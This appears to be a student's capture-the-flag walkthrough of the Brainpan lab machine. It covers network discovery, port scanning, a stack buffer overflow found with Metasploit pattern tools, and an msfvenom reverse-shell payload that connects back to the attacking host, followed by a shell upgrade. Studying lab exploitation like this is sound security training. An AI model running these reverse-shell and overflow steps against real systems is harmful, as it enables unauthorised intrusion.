# Brainpain 192.168.56.102
## Andrea Zonnekus 18758119

1. Use netdiscover to locate the IP address
   1. sudo netdiscover -I eth0 -pf > netdiscover

![](brainpan_steps/Aspose.Words.1e32ddea-f5a3-4c5f-a1d8-3a2ec9cee0ff.001.png)

1. Use nmap to enumerate the ports
   1. sudo nmap -Pn  -F -oX brain\_host.xml 192.168.56.100

All ports with this option are filtered, tried specifying range 

1. sudo nmap -Pn -p- 192.168.56.102/24

![](brainpan_steps/Aspose.Words.1e32ddea-f5a3-4c5f-a1d8-3a2ec9cee0ff.002.png)

Seems like host was reassigned??

1. ` `Navigate to the host
   1. wget on host refused
   1. try both ports for content

![](brainpan_steps/Aspose.Words.1e32ddea-f5a3-4c5f-a1d8-3a2ec9cee0ff.003.png) 


![](brainpan_steps/Aspose.Words.1e32ddea-f5a3-4c5f-a1d8-3a2ec9cee0ff.004.png)Nothing interesting

1. Check some common subdirectories

![](brainpan_steps/Aspose.Words.1e32ddea-f5a3-4c5f-a1d8-3a2ec9cee0ff.005.png)

![](brainpan_steps/Aspose.Words.1e32ddea-f5a3-4c5f-a1d8-3a2ec9cee0ff.006.png)

Interesting



1. Run the exe file with wine

![](brainpan_steps/Aspose.Words.1e32ddea-f5a3-4c5f-a1d8-3a2ec9cee0ff.007.png)Abyss is a telnet service

![](brainpan_steps/Aspose.Words.1e32ddea-f5a3-4c5f-a1d8-3a2ec9cee0ff.008.png)



1. Buffer overflow

![](brainpan_steps/Aspose.Words.1e32ddea-f5a3-4c5f-a1d8-3a2ec9cee0ff.009.png)

Need to do some kind if investigation into the binary

https://www.megabeets.net/a-journey-into-radare-2-part-1/

![](brainpan_steps/Aspose.Words.1e32ddea-f5a3-4c5f-a1d8-3a2ec9cee0ff.010.png)



Overflow again cause I didn’t check the EIP before

b=`/usr/share/metasplot-framework/tools/exploit/pattern\_create.rb -l 1024`

![](brainpan_steps/Aspose.Words.1e32ddea-f5a3-4c5f-a1d8-3a2ec9cee0ff.011.png)

Looks like the address 35724134 is where the executable area starts

/usr/share/metasplot-framework/tools/exploit/pattern\_offset.rb -l 35724134

Offset is 524



Python script to overflow into the esp:

![](brainpan_steps/Aspose.Words.1e32ddea-f5a3-4c5f-a1d8-3a2ec9cee0ff.012.png)

Create badchars and send them through:

![](brainpan_steps/Aspose.Words.1e32ddea-f5a3-4c5f-a1d8-3a2ec9cee0ff.013.png)

Generate a reverse shell and add the bytes to the script:

![](brainpan_steps/Aspose.Words.1e32ddea-f5a3-4c5f-a1d8-3a2ec9cee0ff.014.png)

Generate a reverse shell with the correct infrastructure:

![](brainpan_steps/Aspose.Words.1e32ddea-f5a3-4c5f-a1d8-3a2ec9cee0ff.015.png)



After changing the host to the attacking machine and fixing the reference to the encoder, was able to launch a reverse shell:

![](brainpan_steps/Aspose.Words.1e32ddea-f5a3-4c5f-a1d8-3a2ec9cee0ff.016.png)

Final fix because I’m actually using kali:

msfvenom -p linux/x86/shell/reverse\_tcp LPORT=4444 LHOST=192.168.56.102 -b “\x00” -e x86/shikata\_ga\_nai -f cs

![](brainpan_steps/Aspose.Words.1e32ddea-f5a3-4c5f-a1d8-3a2ec9cee0ff.017.png)



After some time fine-tuning:

python -c ‘import pty; pty.spawn(“/bin/bash”)’

!/bin/bash

whoami

![](brainpan_steps/Aspose.Words.1e32ddea-f5a3-4c5f-a1d8-3a2ec9cee0ff.018.png)
